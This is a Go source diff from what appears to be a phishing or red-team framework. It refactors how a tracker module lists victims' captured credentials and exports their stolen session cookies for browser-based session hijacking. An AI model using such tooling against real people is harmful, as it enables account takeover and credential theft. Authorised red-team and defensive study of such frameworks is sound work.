@@ -44,11 +44,17 @@ func (module *Tracker) ShowCredentials() {
 		module.Debug("error fetching all victims: %s", err)
 		return
 	}
-
 	module.Debug("There are %d victims", len(victims))
-	for _, vID := range victims {
-		for _, c := range vID.Credentials {
-			rows = append(rows, []string{tui.Bold(tui.Green(vID.ID)), c.Key, c.Value, c.Time})
+
+	for _, victim := range victims {
+		credentials, err := victim.GetCredentials()
+		if err != nil {
+			module.Error("Unable to retrieve victim: %s credentials. %v", tui.Bold(victim.ID), err)
+			continue
+		}
+
+		for _, c := range credentials {
+			rows = append(rows, []string{tui.Bold(tui.Green(victim.ID)), c.Key, c.Value, c.Time})
 		}
 	}
 
@@ -65,10 +71,16 @@ func (module *Tracker) ExportSession(id string) {
 		module.Debug("error fetching victim %d: %s", id, err)
 	}
 
+	victimCookies, err := victim.GetCookieJar()
+	if err != nil {
+		module.Error("Unable to retrieve victim: %s cookies. %v", tui.Bold(victim.ID), err)
+		return
+	}
+
 	// this extra loop and struct is needed since browsers expect the expiration time in unix time, so also different type
 	var cookieJar []necrobrowser.SessionCookie
 
-	for _, c := range victim.Cookies {
+	for _, c := range victimCookies {
 		log.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
 		t, err := time.Parse(timeLayout, c.Expires)
 		if err != nil {
